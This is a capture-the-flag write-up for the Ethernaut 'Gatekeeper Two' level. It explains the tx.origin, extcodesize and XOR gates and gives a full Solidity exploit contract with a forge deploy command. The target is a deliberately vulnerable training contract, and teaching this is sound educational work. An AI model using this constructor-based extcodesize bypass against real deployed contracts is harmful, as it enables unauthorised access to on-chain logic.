@@ -1,0 +1,76 @@
+"This is another Gatekeeper level that asks us to go through all the modifiers in order to become the entrant and complete the level. 
+There are two new concepts to learn here. They are extcodesize and XOR. Let's dive in.
+extcodesize
+XOR
+modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+}
+
+This modifier ensures that the msg.sender should not be equal to tx.origin. This is similar to Level 04 - Telephone.
+msg.sender
+tx.origin
+To make sure our msg.sender and tx.origin are different, we need to create an intermediary contract that will make function calls to the Gatekeeper contract. This will make our caller's address the tx.origin and our deployed contract's address will be the msg.sender as received by the Gatekeeper.
+msg.sender
+tx.origin
+tx.origin
+msg.sender
+modifier gateTwo() {
+    uint x;
+    assembly { 
+        x := extcodesize(caller()) 
+    }
+    require(x == 0);
+    _;
+}
+
+In Solidity, we can use low-level codes by using assembly in YUL. They can be used inside assembly {...}. extcodesize is one such opcode that returns the code's size of any address.  
+assembly {...}
+extcodesize
+This is the address of the call sender (except in the case of delegatecall). 
+In the modifier shown above, the variable x is used to store the size of the code on the caller()'s address, i.e., the contract which will be making a call to Gatekeeper Two's instance. We need to use another contract to make sure we pass the validation in the first gate. 
+x
+caller()
+The x variable is being checked to make sure that the size of the contract's code is 0, in other words, an EOA should make the call and not another contract. 
+x
+So how do we satisfy both gate 1 and 2's criteria? 
+This is where constructor's come into play. During a contract's initialization, or when it's constructor is being called, its runtime code size will always be 0. 
+So when we put our exploit logic and call it from inside a constructor, the return value of extcodesize will always return zero. This essentially means that all our exploit code will be called from inside of our contract's constructor to go through the second gate. 
+extcodesize
+modifier gateThree(bytes8 _gateKey) {
+    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
+    _;
+}
+
+This is a simple XOR operation and we know that A XOR B = C is equal to A XOR C = B. Using this logic we can very easily find the value of the unknown _gateKey simply by using the following code:
+A XOR B = C
+A XOR C = B
+_gateKey
+bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
+
+Time to put everything inside our constructor.
+Here's our final exploit code:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import ""../instances/Ilevel14.sol"";
+
+contract LetMeInTwo {
+
+    constructor () public {
+        GatekeeperTwo level12 = GatekeeperTwo(0x2D55d7Fd2cd2d3344F2Fd694f05E3fd63A9FDCDA);
+        bytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
+        level12.enter(myKey);        
+    }
+}
+
+Let's deploy the contract using the command. Once this is deployed, the constructor will be triggered automatically completing the instance. 
+forge create LetMeInTwo --private-key $PKEY --rpc-url $RPC_URL
+
+
+The updated entrant can be queried using await contract.entrant:
+
+await contract.entrant
+My Github Repository containing all the codes: github.com/az0mb13/ethernaut-foundry
+This level was more CTF-focused and taught us the use of extcodesize and its complications during contract deployment. 
+extcodesize"
